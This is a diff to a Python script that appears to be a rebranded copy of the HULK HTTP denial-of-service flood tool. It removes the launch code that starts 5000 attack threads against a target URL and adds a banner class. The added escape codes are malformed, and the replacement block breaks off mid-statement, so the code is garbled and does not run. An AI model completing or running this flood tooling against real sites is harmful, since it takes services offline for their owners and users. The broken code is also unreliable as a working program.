@@ -9,6 +9,27 @@ import sys
 import threading
 import random
 import re
+import socket
+import time
+import os
+import random
+
+from threading import Thread
+
+os.system("clear")
+
+if not __name__ == "__main__":
+    exit()
+
+class ConsoleColors:
+    HEADER = '\066[makara'
+    OKBLUE = '\066[mkra'
+    OKGREEN = '\066[1🥀'
+    WARNING = '\066[វាយប្រហារ'
+    FAIL = '\066[សូមរងចាំ'
+    BOLD = '\066['
+
+
 
 #global params
 url=''
@@ -136,17 +157,5 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print "-- HULK Attack Started --"
-		if len(sys.argv)== 3:
-			if sys.argv[2]=="safe":
-				set_safe()
-		url = sys.argv[1]
-		if url.count("/")==2:
-			url = url + "/"
-		m = re.search('(https?\://)?([^/]*)/?.*', url)
-		host = m.group(2)
-		for i in range(5000):
-			t = HTTPThread()
-			t.start()
-		t = MonitorThread()
-		t.start()
+		print "-- mkra Attack Started --"
+		if len(sys.argv)== 3
